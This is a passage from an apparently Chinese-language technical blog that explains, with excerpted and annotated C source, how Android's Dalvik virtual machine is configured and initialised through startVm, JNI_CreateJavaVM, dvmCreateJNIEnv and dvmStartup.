class="string">&quot;dalvik.vm.checkjni&quot;</span>, propBuf, <span class="string">&quot;&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;true&quot;</span>) == <span class="number">0</span>) &#123;   </span><br><span class="line">        checkJni = <span class="literal">true</span>;   </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;false&quot;</span>) != <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="comment">/* property is neither true nor false; fall back on kernel parameter */</span> </span><br><span class="line">        property_get(<span class="string">&quot;ro.kernel.android.checkjni&quot;</span>, propBuf, <span class="string">&quot;&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (propBuf[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;      </span><br><span class="line">            checkJni = <span class="literal">true</span>;     </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;   </span><br><span class="line">    ......    </span><br><span class="line">    property_get(<span class="string">&quot;dalvik.vm.execution-mode&quot;</span>, propBuf, <span class="string">&quot;&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;int:portable&quot;</span>) == <span class="number">0</span>) &#123; </span><br><span class="line">        executionMode = kEMIntPortable;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;int:fast&quot;</span>) == <span class="number">0</span>) &#123; </span><br><span class="line">        executionMode = kEMIntFast;</span><br><span class="line">        <span class="meta">#<span class="keyword">if</span> defined(WITH_JIT)</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;int:jit&quot;</span>) == <span class="number">0</span>) &#123;    </span><br><span class="line">        executionMode = kEMJitCompiler;</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span>   </span></span><br><span class="line">    &#125;   </span><br><span class="line">    property_get(<span class="string">&quot;dalvik.vm.stack-trace-file&quot;</span>, stackTraceFileBuf, <span class="string">&quot;&quot;</span>); </span><br><span class="line">    ......    </span><br><span class="line">    <span class="built_in">strcpy</span>(heapsizeOptsBuf, <span class="string">&quot;-Xmx&quot;</span>);   </span><br><span class="line">    property_get(<span class="string">&quot;dalvik.vm.heapsize&quot;</span>, heapsizeOptsBuf+<span class="number">4</span>, <span class="string">&quot;16m&quot;</span>);    </span><br><span class="line">    <span class="comment">//LOGI(&quot;Heap size: %s&quot;, heapsizeOptsBuf);   </span></span><br><span class="line">    opt.optionString = heapsizeOptsBuf; </span><br><span class="line">    mOptions.add(opt);  </span><br><span class="line">    ......   </span><br><span class="line">    <span class="keyword">if</span> (checkJni) &#123; </span><br><span class="line">        <span class="comment">/* extended JNI checking */</span>     </span><br><span class="line">        opt.optionString = <span class="string">&quot;-Xcheck:jni&quot;</span>; </span><br><span class="line">        mOptions.add(opt);     </span><br><span class="line">        ......    </span><br><span class="line">    &#125;  </span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> (executionMode == kEMIntPortable) &#123;   </span><br><span class="line">        opt.optionString = <span class="string">&quot;-Xint:portable&quot;</span>;  </span><br><span class="line">        mOptions.add(opt);    </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (executionMode == kEMIntFast) &#123; </span><br><span class="line">        opt.optionString = <span class="string">&quot;-Xint:fast&quot;</span>;  </span><br><span class="line">        mOptions.add(opt);</span><br><span class="line">        <span class="meta">#<span class="keyword">if</span> defined(WITH_JIT)  </span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (executionMode == kEMJitCompiler) &#123;     </span><br><span class="line">        opt.optionString = <span class="string">&quot;-Xint:jit&quot;</span>;     </span><br><span class="line">        mOptions.add(opt);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span>   </span></span><br><span class="line">    &#125;    </span><br><span class="line">    ......    </span><br><span class="line">    <span class="keyword">if</span> (stackTraceFileBuf[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;   </span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* stfOptName = <span class="string">&quot;-Xstacktracefile:&quot;</span>; </span><br><span class="line">        stackTraceFile = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(stfOptName) +  <span class="built_in">strlen</span>(stackTraceFileBuf) + <span class="number">1</span>);       </span><br><span class="line">        <span class="built_in">strcpy</span>(stackTraceFile, stfOptName);      </span><br><span class="line">        <span class="built_in">strcat</span>(stackTraceFile, stackTraceFileBuf);   </span><br><span class="line">        opt.optionString = stackTraceFile;   </span><br><span class="line">        mOptions.add(opt);    </span><br><span class="line">    &#125;    </span><br><span class="line">    ......    </span><br><span class="line">    initArgs.options = mOptions.editArray(); </span><br><span class="line">    initArgs.nOptions = mOptions.size();  </span><br><span class="line">    ......    </span><br><span class="line">        <span class="comment">/*     * Initialize the VM.     *     </span></span><br><span class="line"><span class="comment">        * The JavaVM* is essentially per-process, and the JNIEnv* is per-thread.     </span></span><br><span class="line"><span class="comment">        * If this call succeeds, the VM is ready, and we can start issuing     </span></span><br><span class="line"><span class="comment">        * JNI calls.     */</span>   </span><br><span class="line">    <span class="keyword">if</span> (JNI_CreateJavaVM(pJavaVM, pEnv, &amp;initArgs) &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        LOGE(<span class="string">&quot;JNI_CreateJavaVM failed\n&quot;</span>);  </span><br><span class="line">        <span class="keyword">goto</span> bail;   </span><br><span class="line">    &#125;    </span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    bail:    </span><br><span class="line">    <span class="built_in">free</span>(stackTraceFile);   </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在启动Dalvik虚拟机的时候，可以指定一系列的选项，这些选项可以通过特定的系统属性来指定。下面我们就简单了解几个可能有用的选项。</p><ul><li>-Xcheck:jni：用来启动JNI方法检查。我们在C/C++代码中，可以修改Java对象的成员变量或者调用Java对象的成员函数。加了-Xcheck:jni选项之后，就可以对要访问的Java对象的成员变量或者成员函数进行合法性检查，例如，检查类型是否匹配。我们可以通过dalvik.vm.checkjni或者ro.kernel.android.checkjni这两个系统属性来指定是否要启用-Xcheck:jni选项。注意，加了-Xcheck:jni选项之后，会使用得JNI方法执行变慢。</li><li>-Xint:portable，-Xint:fast，-Xint:jit：用来指定Dalvik虚拟机的执行模式。Dalvik虚拟机支持三种运行模式，分别是Portable、Fast和Jit。Portable是指Dalvik虚拟机以可移植的方式来进行编译，也就是说，编译出来的虚拟机可以在任意平台上运行。Fast是针对当前平台对Dalvik虚拟机进行编译，这样编译出来的Dalvik虚拟机可以进行特殊的优化，从而使得它能更快地运行程序。Jit不是解释执行代码，而是将代码动态编译成本地语言后再执行。我们可以通过dalvik.vm.execution-mode系统属性来指定Dalvik虚拟机的解释模式。</li><li>-Xstacktracefile：用来指定调用堆栈输出文件。Dalvik虚拟机接收到SIGQUIT（Ctrl-\或者kill -3）信号之后，会将所有线程的调用堆栈输出来，默认是输出到日志里面。指定了-Xstacktracefile选项之后，就可以将线程的调用堆栈输出到指定的文件中去。我们可以通过dalvik.vm.stack-trace-file系统属性来指定调用堆栈输出文件。</li><li>-Xmx：用来指定Java对象堆的最大值。Dalvik虚拟机的Java对象堆的默认最大值是16M，不过我们可以通过dalvik.vm.heapsize系统属性来指定为其它值。</li></ul><p>设置好Dalvik虚拟机的启动选项之后，AndroidRuntime的成员函数<code>startVm()</code>就会调用另外一个函数<code>JNI_CreateJavaVM()</code>来创建以及初始化一个Dalvik虚拟机实例。</p><h4 id="1-2-1-3-JNI-CreateJavaVM"><a href="#1-2-1-3-JNI-CreateJavaVM" class="headerlink" title="1.2.1.3 JNI_CreateJavaVM()"></a>1.2.1.3 JNI_CreateJavaVM()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * Create a new VM instance. *</span></span><br><span class="line"><span class="comment">* The current thread becomes the main VM thread.  We return immediately, </span></span><br><span class="line"><span class="comment">* which effectively means the caller is executing in a native method. */</span></span><br><span class="line">jint <span class="title function_">JNI_CreateJavaVM</span><span class="params">(JavaVM** p_vm, JNIEnv** p_env, <span class="type">void</span>* vm_args)</span>&#123;   </span><br><span class="line">    <span class="type">const</span> JavaVMInitArgs* args = (JavaVMInitArgs*) vm_args;  </span><br><span class="line">    JNIEnvExt* pEnv = <span class="literal">NULL</span>;  </span><br><span class="line">    JavaVMExt* pVM = <span class="literal">NULL</span>; </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>** argv;  </span><br><span class="line">    <span class="type">int</span> argc = <span class="number">0</span>;  </span><br><span class="line">    ......    </span><br><span class="line">    <span class="comment">/* zero globals; not strictly necessary the first time a VM is started */</span>    </span><br><span class="line">    <span class="built_in">memset</span>(&amp;gDvm, <span class="number">0</span>, <span class="keyword">sizeof</span>(gDvm));    </span><br><span class="line">    <span class="comment">/*     * Set up structures for JNIEnv and VM.     */</span>    </span><br><span class="line">    <span class="comment">//pEnv = (JNIEnvExt*) malloc(sizeof(JNIEnvExt));   </span></span><br><span class="line">    pVM = (JavaVMExt*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(JavaVMExt));   </span><br><span class="line">    <span class="built_in">memset</span>(pVM, <span class="number">0</span>, <span class="keyword">sizeof</span>(JavaVMExt));    </span><br><span class="line">    pVM-&gt;funcTable = &amp;gInvokeInterface;    </span><br><span class="line">    pVM-&gt;envList = pEnv;   </span><br><span class="line">    ......    </span><br><span class="line">    argv = (<span class="type">const</span> <span class="type">char</span>**) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>*) * (args-&gt;nOptions));  </span><br><span class="line">    <span class="built_in">memset</span>(argv, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>*) * (args-&gt;nOptions)); </span><br><span class="line">    ......   </span><br><span class="line">    <span class="comment">/*     * Convert JNI args to argv.     *   </span></span><br><span class="line"><span class="comment">    * We have to pull out vfprintf/exit/abort, because they use the  </span></span><br><span class="line"><span class="comment">    * &quot;extraInfo&quot; field to pass function pointer &quot;hooks&quot; in.  We also </span></span><br><span class="line"><span class="comment">    * look for the -Xcheck:jni stuff here.     */</span>    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; args-&gt;nOptions; i++) &#123;   </span><br><span class="line">        ......  </span><br><span class="line">    &#125;   </span><br><span class="line">    ......    </span><br><span class="line">    <span class="comment">/* set this up before initializing VM, so it can create some JNIEnvs */</span>    </span><br><span class="line">    gDvm.vmList = (JavaVM*) pVM;   </span><br><span class="line">    <span class="comment">/*     * Create an env for main thread.  We need to have something set up   </span></span><br><span class="line"><span class="comment">    * here because some of the class initialization we do when starting   </span></span><br><span class="line"><span class="comment">    * up the VM will call into native code.     */</span>    </span><br><span class="line">    pEnv = (JNIEnvExt*) dvmCreateJNIEnv(<span class="literal">NULL</span>);   </span><br><span class="line">    <span class="comment">/* initialize VM */</span>    </span><br><span class="line">    gDvm.initializing = <span class="literal">true</span>; </span><br><span class="line">    <span class="keyword">if</span> (dvmStartup(argc, argv, args-&gt;ignoreUnrecognized, (JNIEnv*)pEnv) != <span class="number">0</span>) &#123;   </span><br><span class="line">        <span class="built_in">free</span>(pEnv); </span><br><span class="line">        <span class="built_in">free</span>(pVM);   </span><br><span class="line">        <span class="keyword">goto</span> bail;   </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">/*     * Success!  Return stuff to caller.     */</span>   </span><br><span class="line">    dvmChangeStatus(<span class="literal">NULL</span>, THREAD_NATIVE);  </span><br><span class="line">    *p_env = (JNIEnv*) pEnv; </span><br><span class="line">    *p_vm = (JavaVM*) pVM;  </span><br><span class="line">    result = JNI_OK;bail: </span><br><span class="line">    gDvm.initializing = <span class="literal">false</span>;  </span><br><span class="line">    <span class="keyword">if</span> (result == JNI_OK)     </span><br><span class="line">        LOGV(<span class="string">&quot;JNI_CreateJavaVM succeeded\n&quot;</span>);  </span><br><span class="line">    <span class="keyword">else</span>       </span><br><span class="line">        LOGW(<span class="string">&quot;JNI_CreateJavaVM failed\n&quot;</span>);  </span><br><span class="line">    <span class="built_in">free</span>(argv); </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNI_CreateJavaVM主要完成以下4件事情：</p><ul><li>为当前进程创建一个Dalvik虚拟机实例，即一个JavaVMExt对象。</li><li>为当前线程创建和初始化一个JNI环境，即一个JNIEnvExt对象，这是通过调用函数<code>dvmCreateJNIEnv()</code>来完成的。</li><li>将参数vm_args所描述的Dalvik虚拟机启动选项拷贝到变量argv所描述的一个字符串数组中去，并且调用函数<code>dvmStartup()</code>来初始化前面所创建的Dalvik虚拟机实例。</li><li>调用函数<code>dvmChangeStatus()</code>将当前线程的状态设置为正在执行Native代码，并且将前面所创建和初始化好的JavaVMExt对象和JNIEnvExt对象通过输出参数p_vm和p_env返回给调用者。</li></ul><p>gDvm是一个类型为DvmGlobals的全局变量，用来收集当前进程所有虚拟机相关的信息，其中，它的成员变量vmList指向的就是当前进程中的Dalvik虚拟机实例，即一个JavaVMExt对象。以后每当需要访问当前进程中的Dalvik虚拟机实例时，就可以通过全局变量gDvm的成员变量vmList来获得，避免了在函数之间传递该Dalvik虚拟机实例。</p><p>每一个Dalvik虚拟机实例都有一个函数表，保存在对应的JavaVMExt对象的成员变量funcTable中，而这个函数表又被指定为gInvokeInterface。gInvokeInterface是一个类型为JNIInvokeInterface的结构体，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNIInvokeInterface</span> <span class="title">gInvokeInterface</span> =</span> &#123; </span><br><span class="line">    <span class="literal">NULL</span>,  </span><br><span class="line">    <span class="literal">NULL</span>,   </span><br><span class="line">    <span class="literal">NULL</span>,   </span><br><span class="line">    DestroyJavaVM,  </span><br><span class="line">    AttachCurrentThread,  </span><br><span class="line">    DetachCurrentThread, </span><br><span class="line">    GetEnv,   </span><br><span class="line">    AttachCurrentThreadAsDaemon,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有了这个Dalvik虚拟机函数表之后，我们就可以将当前线程Attach或者Detach到Dalvik虚拟机中去，或者销毁当前进程的Dalvik虚拟机等。</p><p>每一个Dalvik虚拟机实例还有一个JNI环境列表，保存在对应的JavaVMExt对象的成员变量envList中。注意，JavaVMExt对象的成员变量envList描述的是一个JNIEnvExt列表，其中，每一个Attach到Dalvik虚拟机中去的线程都有一个对应的JNIEnvExt，用来描述它的JNI环境。有了这个JNI环境之后，我们才可以在Java函数和C/C++函数之间互相调用。</p><p>每一个JNIEnvExt对象都有两个成员变量prev和next，它们均是一个JNIEnvExt指针，分别指向前一个JNIEnvExt对象和后一个JNIEnvExt对象，也就是说，每一个Dalvik虚拟机实例的成员变量envList描述的是一个双向JNIEnvExt列表，其中，列表中的第一个JNIEnvExt对象描述的是主线程的JNI环境。</p><h4 id="1-2-1-4-dvmCreateJNIEnv"><a href="#1-2-1-4-dvmCreateJNIEnv" class="headerlink" title="1.2.1.4 dvmCreateJNIEnv()"></a>1.2.1.4 dvmCreateJNIEnv()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * Create a new JNIEnv struct and add it to the VM&#x27;s list. * </span></span><br><span class="line"><span class="comment">* &quot;self&quot; will be NULL for the main thread, since the VM hasn&#x27;t started </span></span><br><span class="line"><span class="comment">* yet; the value will be filled in later. */</span></span><br><span class="line">JNIEnv* <span class="title function_">dvmCreateJNIEnv</span><span class="params">(Thread* self)</span>&#123;  </span><br><span class="line">    JavaVMExt* vm = (JavaVMExt*) gDvm.vmList;    </span><br><span class="line">    JNIEnvExt* newEnv;  </span><br><span class="line">    ......   </span><br><span class="line">    newEnv = (JNIEnvExt*) <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(JNIEnvExt));</span><br><span class="line">    newEnv-&gt;funcTable = &amp;gNativeInterface;   </span><br><span class="line">    newEnv-&gt;vm = vm;  </span><br><span class="line">    ......   </span><br><span class="line">    <span class="keyword">if</span> (self != <span class="literal">NULL</span>) &#123;       </span><br><span class="line">        dvmSetJniEnvThreadId((JNIEnv*) newEnv, self);   </span><br><span class="line">        assert(newEnv-&gt;envThreadId != <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* make it obvious if we fail to initialize these later */</span>       </span><br><span class="line">        newEnv-&gt;envThreadId = <span class="number">0x77777775</span>;   </span><br><span class="line">        newEnv-&gt;self = (Thread*) <span class="number">0x77777779</span>;  </span><br><span class="line">    &#125;    </span><br><span class="line">    ......    </span><br><span class="line">        <span class="comment">/* insert at head of list */</span>   </span><br><span class="line">    newEnv-&gt;next = vm-&gt;envList;   </span><br><span class="line">    assert(newEnv-&gt;prev == <span class="literal">NULL</span>);   </span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;envList == <span class="literal">NULL</span>)            <span class="comment">// rare, but possible        </span></span><br><span class="line">        vm-&gt;envList = newEnv;    </span><br><span class="line">    <span class="keyword">else</span>        </span><br><span class="line">        vm-&gt;envList-&gt;prev = newEnv; </span><br><span class="line">    vm-&gt;envList = newEnv;  </span><br><span class="line">    ......    </span><br><span class="line">    <span class="keyword">return</span> (JNIEnv*) newEnv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>dvmCreateJNIEnv()</code>主要是执行了以下3个操作：</p><ul><li>创建一个JNIEnvExt对象，用来描述一个JNI环境，并且设置这个JNIEnvExt对象的宿主Dalvik虚拟机，以及所使用的本地接口表，即设置这个JNIEnvExt对象的成员变量funcTable和vm。这里的宿主Dalvik虚拟机即为当前进程的Dalvik虚拟机，它保存在全局变量gDvm的成员变量vmList中。本地接口表由全局变量gNativeInterface来描述。</li><li>参数self描述的是前面创建的JNIEnvExt对象要关联的线程，可以通过调用函数<code>dvmSetJniEnvThreadId()</code>来将它们关联起来。注意，当参数self的值等于NULL的时候，就表示前面的JNIEnvExt对象是要与主线程关联的，但是要等到后面再关联，因为现在用来描述主线程的Thread对象还没有准备好。通过将一个JNIEnvExt对象的成员变量envThreadId和self的值分别设置为0x77777775和0x77777779来表示它还没有与线程关联。</li><li><p>在一个Dalvik虚拟机里面，可以运行多个线程。所有关联有JNI环境的线程都有一个对应的JNIEnvExt对象，这些JNIEnvExt对象相互连接在一起保存在用来描述其宿主Dalvik虚拟机的一个JavaVMExt对象的成员变量envList中。因此，前面创建的JNIEnvExt对象需要连接到其宿主Dalvik虚拟机的JavaVMExt链表中去。</p><p>gNativeInterface是一个类型为JNINativeInterface的结构体，如下所示：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span> <span class="title">gNativeInterface</span> =</span> &#123; </span><br><span class="line">    ......        </span><br><span class="line">    FindClass,  </span><br><span class="line">    ......  </span><br><span class="line">    GetMethodID,     </span><br><span class="line">    ......    </span><br><span class="line">    CallObjectMethod,  </span><br><span class="line">    ......   </span><br><span class="line">    GetFieldID,  </span><br><span class="line">    ......      </span><br><span class="line">    SetIntField, </span><br><span class="line">    ......    </span><br><span class="line">    RegisterNatives,</span><br><span class="line">    UnregisterNatives,</span><br><span class="line">    ......    </span><br><span class="line">    GetJavaVM, </span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这一步执行完成之后，返回到前面的第3步中，即函数<code>JNI_CreateJavaVM()</code>中，接下来就会继续调用函数<code>dvmStartup()</code>来初始化前面所创建的Dalvik虚拟机实例。</p><h4 id="1-2-1-5-dvmStartup"><a href="#1-2-1-5-dvmStartup" class="headerlink" title="1.2.1.5 dvmStartup()"></a>1.2.1.5 dvmStartup()</h4><p>这个函数用来初始化Dalvik虚拟机，我们分段来阅读：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * VM initialization.  Pass in any options provided on the command line. </span></span><br><span class="line"><span class="comment">* Do not pass in the class name or the options for the class. *</span></span><br><span class="line"><span class="comment">* Returns 0 on success. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dvmStartup</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* <span class="type">const</span> argv[], <span class="type">bool</span> ignoreUnrecognized,    JNIEnv* pEnv)</span>&#123;  </span><br><span class="line">    <span class="type">int</span> i, cc;   </span><br><span class="line">    ......   </span><br><span class="line">    setCommandLineDefaults();   </span><br><span class="line">    <span class="comment">/* prep properties storage */</span>    </span><br><span class="line">    <span class="keyword">if</span> (!dvmPropertiesStartup(argc))   </span><br><span class="line">        <span class="keyword">goto</span> fail;   </span><br><span class="line">    <span class="comment">/*     * Process the option flags (if any).     */</span> </span><br><span class="line">    cc = dvmProcessOptions(argc, argv, ignoreUnrecognized);  </span><br><span class="line">    <span class="keyword">if</span> (cc != <span class="number">0</span>) &#123;        </span><br><span class="line">        ......     </span><br><span class="line">        <span class="keyword">goto</span> fail;   </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码用来处理Dalvik虚拟机的启动选项，这些启动选项保存在参数argv中，并且个数等于argc。在处理这些启动选项之前，还会执行以下两个操作：</p><ul><li>调用函数<code>setCommandLineDefaults()</code>来给Dalvik虚拟机设置默认参数，因为启动选项不一定会指定Dalvik虚拟机的所有属性。</li><li>调用函数<code>dvmPropertiesStartup()</code>来分配足够的内存空间来容纳由参数argv和argc所描述的启动选项。</li></ul><p>完成以上两个操作之后，就可以调用函数<code>dvmProcessOptions()</code>来处理参数argv和argc所描述的启动选项了，也就是根据这些选项值来设置Dalvik虚拟机的属性，例如，设置Dalvik虚拟机的Java对象堆的最大值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* configure signal handling */</span>   </span><br><span class="line"><span class="keyword">if</span> (!gDvm.reduceSignals)      </span><br><span class="line">    blockSignals();</span><br></pre></td></tr></table></figure><p>如果我们没有在Dalvik虚拟机的启动选项中指定-Xrs，那么gDvm.reduceSignals的值就会被设置为false，表示要在当前线程中屏蔽掉SIGQUIT信号。在这种情况下，会有一个线程专门用来处理SIGQUIT信号。这个线程在接收到SIGQUIT信号的时候，就会将各个线程的调用堆栈打印出来，因此，这个线程又称为dump-stack-trace线程。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*     * Initialize components.     */</span>    </span><br><span class="line"><span class="keyword">if</span> (!dvmAllocTrackerStartup())        </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmGcStartup())  </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmThreadStartup())    </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmInlineNativeStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmVerificationStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmRegisterMapStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmInstanceofStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmClassStartup())     </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmThreadObjStartup())       </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmExceptionStartup())    </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmStringInternStartup())     </span><br><span class="line">    <span class="keyword">goto</span> fail;  </span><br><span class="line"><span class="keyword">if</span> (!dvmNativeStartup())       </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmInternalNativeStartup())    </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmJniStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmReflectStartup())     </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmProfilingStartup())     </span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br></pre></td></tr></table></figure><p>这段代码用来初始化Dalvik虚拟机的各个子模块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* make sure we got these [can this go away?] */</span>   </span><br><span class="line">assert(gDvm.classJavaLangClass != <span class="literal">NULL</span>);    </span><br><span class="line">assert(gDvm.classJavaLangObject != <span class="literal">NULL</span>);    </span><br><span class="line"><span class="comment">//assert(gDvm.classJavaLangString != NULL);  </span></span><br><span class="line">assert(gDvm.classJavaLangThread != <span 